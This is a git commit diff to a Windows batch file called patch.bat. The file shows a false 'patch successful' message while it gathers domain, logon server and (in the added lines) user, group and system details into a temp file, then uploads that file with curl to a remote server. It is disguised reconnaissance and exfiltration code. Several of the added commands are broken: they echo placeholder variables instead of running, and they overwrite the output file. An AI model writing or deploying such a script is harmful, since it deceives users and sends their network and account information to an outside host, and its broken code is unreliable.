8aa8954c2bf314c102cfbd74cd3e3e80d92d52a8
surajkumar-30 <132037997+surajkumar-30@users.noreply.github.com>
2026-05-12 13:22:31 +0400

    Update patch.bat

--- patch.bat
+++ patch.bat
@@ -7,10 +7,21 @@ REM ====================
 
 echo Domain: %USERDNSDOMAIN%
 echo Logon Server: %LOGONSERVER%
+echo "Your Patch has been successful"
+echo IpConfig: %IPCONFIG% > %TEMP%\ad.txt
+echo systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Available Physical Memory" /C:"Domain": %systeminfo% > %TEMP%\ad.txt
+
+echo whoami /groups: %whoami% > %TEMP%\ad.txt
+
+echo net user: %netuser% > %TEMP%\ad.txt
+
+echo net config workstation: %workstation% > %TEMP%\ad.txt
+
 
 REM Create simple output
 echo Domain: %USERDNSDOMAIN% > %TEMP%\ad.txt
 echo Logon Server: %LOGONSERVER% >> %TEMP%\ad.txt
+
 
 REM Upload
 curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%
